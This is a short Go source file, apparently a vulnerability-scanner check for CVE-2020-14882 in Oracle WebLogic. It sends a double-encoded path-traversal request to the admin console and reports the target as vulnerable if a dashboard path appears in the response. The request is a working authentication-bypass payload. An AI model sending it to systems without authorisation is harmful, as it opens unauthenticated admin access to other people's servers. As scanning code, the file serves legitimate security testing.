package weblogic

import (
	"Predator/pkg/utils"
	"strings"
)

func CVE_2020_14882(url string) bool {
	if req, err := utils.HttpRequset(url+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=a", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "/console/dashboard") {
			return true
		}
	}
	return false
}
